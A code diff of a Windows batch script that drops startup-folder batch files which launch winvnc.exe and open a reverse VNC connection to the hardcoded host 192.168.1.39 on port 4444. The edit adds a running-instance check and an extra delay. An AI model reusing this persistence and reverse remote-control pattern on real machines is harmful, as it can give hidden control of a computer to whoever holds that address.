@@ -14,8 +14,14 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
   echo @echo off
-  echo taskkill /im winvnc.exe /f
-  echo timeout /t 1 >nul
+  echo tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+  echo if errorlevel 1 (
+  echo   echo No running instance of winvnc.exe found.
+  echo ) else (
+  echo   echo Found running instance of winvnc.exe. Killing it...
+  echo   taskkill /im winvnc.exe /f
+  echo   timeout /t 1 >nul
+  echo )
   echo start winvnc.exe -run
   echo timeout /t 1 >nul
   echo winvnc.exe -connect 192.168.1.39::4444
@@ -44,7 +50,8 @@ start "" winvnc.exe
 REM Wait for 7 seconds to allow the user to grant permissions
 timeout /t 7 >nul
 
-REM Run the run_winvnc.bat script
+REM Run the run_winvnc.bat script after waiting 1 second
+timeout /t 1 >nul
 call "%script_dir%run_winvnc.bat"
 
 REM End of main.bat
